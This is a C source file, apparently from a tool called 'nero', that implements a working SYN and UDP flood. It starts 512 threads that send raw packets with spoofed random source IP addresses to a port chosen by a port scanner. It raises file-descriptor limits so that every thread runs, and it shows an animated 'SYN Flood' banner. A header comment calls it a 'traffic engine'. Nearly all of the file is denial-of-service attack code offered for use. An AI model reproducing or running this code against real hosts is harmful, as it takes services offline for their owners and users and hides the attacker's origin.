/* Legacy Linux traffic engine. Its worker and signal lifecycle is separate
 * from the shell; macOS production diagnostics are handled in commands.c.
 * Platform build rules decide whether this implementation is linked. */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/resource.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/in.h>
#include <signal.h>
#include <netinet/udp.h>  // struct udphdr

#include "nero/ascii.h"
#include "nero/terminal.h"
#include "nero/portscanner.h"

#define PACKET_SIZE  4096
#define THREAD_COUNT 512

// Global state
volatile sig_atomic_t row;
int port_select;

extern pthread_mutex_t ekran_mutex;

volatile sig_atomic_t stop_flag = 0;

pthread_t threads[THREAD_COUNT];
pthread_t animasyon_thread;

// Pseudo-header for TCP/UDP checksum calculation
struct pseudo_header {
    uint32_t source_address;
    uint32_t dest_address;
    uint8_t  placeholder;
    uint8_t  protocol;
    uint16_t tcp_length;
};

/* Compile-time sanity check: the kernel expects exactly 20 bytes and its
 * own bitfield ordering for the version/ihl pair.  Using glibc's struct
 * iphdr (rather than a hand-rolled one) guarantees that layout matches. */
_Static_assert(sizeof(struct iphdr) == 20, "struct iphdr layout mismatch");

typedef struct {
    const char *target_ip;
    int thread_count;
} AnimationArgs;

/* 32-bit rastgele kaynak IP üretir.
 *
 * rand_r() glibc'de yalnızca 15 bit (0..32767) döndürür.  Bu yüzden
 * `htonl((uint32_t)rand_r(&seed))` kaynak IP'nin üst iki oktetini her
 * zaman 0 yapar.  4 bağımsız `% 256` çağrısıyla tam 32-bit entropi
 * üretiyoruz.
 *
 * Ayrıca kernel `raw_send_hdrinc` içinde multicast (224.0.0.0/4),
 * zero-net (0.0.0.0/8) ve limited-broadcast (255.255.255.255) kaynak
 * adresleri `EINVAL` ile reddeder.  Bunları üretimden dışlıyoruz. */
static inline uint32_t random_src_ip(unsigned int *seed) {
    for (;;) {
        uint32_t a = rand_r(seed) % 256;
        uint32_t b = rand_r(seed) % 256;
        uint32_t c = rand_r(seed) % 256;
        uint32_t d = rand_r(seed) % 256;
        if (a == 0 || a == 127 || a >= 224)   /* zero-net, loopback, multicast/broadcast */
            continue;
        return htonl((a << 24) | (b << 16) | (c << 8) | d);
    }
}

// Signal handler for Ctrl+C: only async-signal-safe calls.
void sigint_handler(int sig) {
    (void)sig;
    stop_flag = 1;
    char seq[32];
    size_t len = 0;
    seq[len++] = '\033';
    seq[len++] = '[';
    int value = row > 0 ? row : 1;
    char digits[12];
    int ndigits = 0;
    do {
        digits[ndigits++] = (char)('0' + value % 10);
        value /= 10;
    } while (value > 0 && ndigits < (int)sizeof(digits));
    while (ndigits > 0 && len < sizeof(seq) - 5)
        seq[len++] = digits[--ndigits];
    seq[len++] = ';';
    seq[len++] = '1';
    seq[len++] = 'H';
    seq[len++] = '\033';
    seq[len++] = '[';
    seq[len++] = 'J';
    (void)write(STDOUT_FILENO, seq, len);
}

/* RFC 1071 Internet checksum.  Returns the one's-complement sum in host
 * byte order (callers store it directly into the header field). */
static unsigned short checksum(unsigned short *ptr, int nbytes) {
    long sum = 0;
    unsigned short oddbyte;
    unsigned short answer;

    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((uint8_t *)&oddbyte) = *(uint8_t *)ptr;
        sum += oddbyte;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (unsigned short)(~sum);
    return answer;
}

int is_target_online(const char *ip) {
    // Reject anything that is not a dotted-quad IPv4 before shelling out:
    // the ping command below is passed to /bin/sh, so unvalidated input
    // would allow shell metacharacters in `ip` to execute arbitrary commands.
    struct in_addr addr;
    if (inet_pton(AF_INET, ip, &addr) != 1)
        return 0;

    char command[128];
    // -c 1: send one packet; -W 1: one-second timeout on Linux
    int written = snprintf(command, sizeof(command),
                           "ping -c 1 -W 1 %s > /dev/null 2>&1", ip);
    if (written < 0 || (size_t)written >= sizeof(command))
        return 0;

    int status = system(command);

    // A zero system() result indicates a successful ping
    return (status == 0);
}

// Thread function: continuously send SYN + UDP packets to target IP
static void *flood(void *arg)
{
    const char *target_ip = (const char *)arg;
    /* Per-thread PRNG state.  time(NULL) tek başına yeterli değil: aynı
     * saniyede başlayan thread'ler aynı seed'i alır.  pthread_self() ve
     * stack adresi karıştırarak thread'leri ayır. */
    unsigned int seed = (unsigned int)time(NULL)
                      ^ (unsigned int)(uintptr_t)pthread_self()
                      ^ (unsigned int)(uintptr_t)&arg
                      ^ (unsigned int)(uintptr_t)&seed;

    struct sockaddr_in sin;
    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port_select);
    sin.sin_addr.s_addr = inet_addr(target_ip);

    // TCP socket
    int sock_tcp = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock_tcp < 0) {
        perror("Failed to create TCP socket");
        pthread_exit(NULL);
    }

    int one = 1;
    if (setsockopt(sock_tcp, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt TCP");
        close(sock_tcp);
        pthread_exit(NULL);
    }

    // UDP socket
    int sock_udp = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock_udp < 0) {
        perror("Failed to create UDP socket");
        close(sock_tcp);
        pthread_exit(NULL);
    }

    if (setsockopt(sock_udp, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt UDP");
        close(sock_tcp);
        close(sock_udp);
        pthread_exit(NULL);
    }

    char datagram[PACKET_SIZE];
    unsigned long tcp_sent = 0, udp_sent = 0;
    unsigned long tcp_err  = 0, udp_err  = 0;

    while (!stop_flag) {

        /* ---------------- TCP ---------------- */
        memset(datagram, 0, PACKET_SIZE);
        struct iphdr *iph = (struct iphdr *)datagram;
        struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));

        /* 1) IP başlığı */
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
        iph->id = htons(rand_r(&seed) % 65535);
        iph->frag_off = 0;
        iph->ttl = 255;
        iph->protocol = IPPROTO_TCP;
        iph->saddr = random_src_ip(&seed);
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = 0;

        /* 2) TCP başlığı */
        tcph->source  = htons(rand_r(&seed) % 65535);
        tcph->dest    = htons(port_select);
        tcph->seq     = rand_r(&seed);
        tcph->ack_seq = 0;
        tcph->doff    = 5;
        tcph->syn     = 1;
        tcph->window  = htons(32767 + rand_r(&seed) % (65536 - 32767));
        tcph->check   = 0;
        tcph->urg_ptr = 0;

        /* 3) IP checksum — SADECE 20 byte (ihl * 4) */
        iph->check = checksum((unsigned short *)datagram, iph->ihl * 4);

        /* 4) TCP checksum — pseudo-header + TCP başlığı */
        struct pseudo_header psh_tcp;
        psh_tcp.source_address = iph->saddr;
        psh_tcp.dest_address   = iph->daddr;
        psh_tcp.placeholder    = 0;
        psh_tcp.protocol       = IPPROTO_TCP;
        psh_tcp.tcp_length     = htons(sizeof(struct tcphdr));

        int psize_tcp = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
        char *pseudogram_tcp = malloc(psize_tcp);
        if (!pseudogram_tcp) {
            close(sock_tcp);
            close(sock_udp);
            pthread_exit(NULL);
        }
        memcpy(pseudogram_tcp, &psh_tcp, sizeof(struct pseudo_header));
        memcpy(pseudogram_tcp + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
        tcph->check = checksum((unsigned short *)pseudogram_tcp, psize_tcp);
        free(pseudogram_tcp);

        if (sendto(sock_tcp, datagram, ntohs(iph->tot_len), 0,
                   (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            if (tcp_err == 0) perror("sendto tcp");
            tcp_err++;
        } else {
            tcp_sent++;
        }

        /* ---------------- UDP ---------------- */
        memset(datagram, 0, PACKET_SIZE);
        iph = (struct iphdr *)datagram;
        struct udphdr *udph = (struct udphdr *)(datagram + sizeof(struct iphdr));

        int payload_len = (rand_r(&seed) % 480) + 32;
        char *payload = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);
        for (int i = 0; i < payload_len; i++) {
            payload[i] = (char)(rand_r(&seed) % 256);
        }

        /* 1) IP başlığı */
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + payload_len);
        iph->id = htons(rand_r(&seed) % 65535);
        iph->frag_off = 0;
        iph->ttl = 255;
        iph->protocol = IPPROTO_UDP;
        iph->saddr = random_src_ip(&seed);
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = 0;

        /* 2) UDP başlığı (payload zaten yazıldı) */
        udph->source = htons(rand_r(&seed) % 65535);
        udph->dest   = htons(port_select);
        udph->len    = htons(sizeof(struct udphdr) + payload_len);
        udph->check  = 0;

        /* 3) IP checksum — SADECE 20 byte */
        iph->check = checksum((unsigned short *)datagram, iph->ihl * 4);

        /* 4) UDP checksum — pseudo-header + UDP başlığı + payload */
        struct pseudo_header psh_udp;
        psh_udp.source_address = iph->saddr;
        psh_udp.dest_address   = iph->daddr;
        psh_udp.placeholder    = 0;
        psh_udp.protocol       = IPPROTO_UDP;
        psh_udp.tcp_length     = htons(sizeof(struct udphdr) + payload_len);

        int psize_udp = sizeof(struct pseudo_header) + sizeof(struct udphdr) + payload_len;
        char *pseudogram_udp = malloc(psize_udp);
        if (!pseudogram_udp) {
            close(sock_tcp);
            close(sock_udp);
            pthread_exit(NULL);
        }
        memcpy(pseudogram_udp, &psh_udp, sizeof(struct pseudo_header));
        memcpy(pseudogram_udp + sizeof(struct pseudo_header), udph,
               sizeof(struct udphdr) + payload_len);
        udph->check = checksum((unsigned short *)pseudogram_udp, psize_udp);
        free(pseudogram_udp);

        if (sendto(sock_udp, datagram, ntohs(iph->tot_len), 0,
                   (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            if (udp_err == 0) perror("sendto udp");
            udp_err++;
        } else {
            udp_sent++;
        }
    }

    if (tcp_err || udp_err || tcp_sent || udp_sent) {
        fprintf(stderr,
                "[worker %p] sent tcp=%lu udp=%lu | errors tcp=%lu udp=%lu\n",
                (void *)pthread_self(), tcp_sent, udp_sent, tcp_err, udp_err);
    }

    close(sock_tcp);
    close(sock_udp);
    pthread_exit(NULL);
}

void *flood_animation(void *arg)
{
    const char *target_ip = (const char *)arg;
    int cerceve_sayisi = 4;
    struct timespec bekleme = {0, 600000000};
    const char *dots[] = {".  ", ".. ", "...", "...."};

    while (!stop_flag)
    {
        for (int i = 0; i < cerceve_sayisi; i++)
        {
            if (stop_flag) break;

            pthread_mutex_lock(&ekran_mutex);
            row = row_location_function();

            printf("\033[%d;1H", row);
            printf("\033[J");

            printf("\033[40m\033[1;31m[*] \033[1;34mSYN Flood \033[0m"
                   "\033[40m\033[1;33m%s \033[1;37mon "
                   "\033[40m\033[1;33m%d \033[1;37m"
                   "\033[1;32m%d \033[1;37mthread%s\033[0m\n\n",
                    target_ip,port_select, THREAD_COUNT, dots[i]);

            fflush(stdout);

            printf("%s", windows[i]);
            fflush(stdout);
            nanosleep(&bekleme, NULL);

            pthread_mutex_unlock(&ekran_mutex);
        }
    }

    return NULL;
}

int port_get(const char *target_ip){
    int selected = portscanner(target_ip);
    if (selected < 0) {
        fprintf(stderr, "\n\033[49m[!]\033[0m\033[1;31m Port selection aborted.\033[0m\n");
        return -1;
    }
    if (selected == 0) {
        fprintf(stderr, "\n\033[49m[!]\033[0m\033[1;31m No open port found on %s.\033[0m\n", target_ip);
        return -1;
    }
    port_select = selected;
    return 0;
}

// Starts THREAD_COUNT threads to flood the provided target IP
int SYN_Flood(const char *target_ip) {
    stop_flag = 0;

    /* 512 threads x 2 raw sockets = 1024 fds; default RLIMIT_NOFILE is
     * usually 1024 and would silently fail late threads. */
    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0) {
        rlim_t want = (rlim_t)(THREAD_COUNT * 2 + 64);
        if (rl.rlim_cur < want) {
            rl.rlim_cur = (rl.rlim_max == RLIM_INFINITY || rl.rlim_max >= want)
                          ? want : rl.rlim_max;
            (void)setrlimit(RLIMIT_NOFILE, &rl);
        }
    }

    if (port_get(target_ip) != 0)
        return 1;

    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = sigint_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;

    if (!is_target_online(target_ip)) {
        fprintf(stderr, "\n\033[49m[!]\033[0m\033[1;31m Target %s is unreachable! (ping failed)\033[0m\n", target_ip);
        return 1;
    }

    if (sigaction(SIGINT, &sa, NULL) == -1) {
        perror("sigaction");
        return 1;
    }

    srand(time(NULL));

    if (pthread_create(&animasyon_thread, NULL, flood_animation, (void *)target_ip) != 0) {
        fprintf(stderr, "Failed to create animation thread\n");
        return 1;
    }

    int threads_created = 0;
    for (int i = 0; i < THREAD_COUNT; i++) {
        if (pthread_create(&threads[i], NULL, flood, (void *)target_ip) != 0) {
            fprintf(stderr, "Failed to create thread %d\n", i);
            break;
        }
        threads_created++;
    }

    for (int i = 0; i < threads_created; i++)
        pthread_join(threads[i], NULL);
    pthread_join(animasyon_thread, NULL);
    printf("[-]Thread\n");

    if (threads_created != THREAD_COUNT) {
        fprintf(stderr, "Failed to start all flood threads (%d of %d)\n",
                threads_created, THREAD_COUNT);
        return 1;
    }

    return 0;
}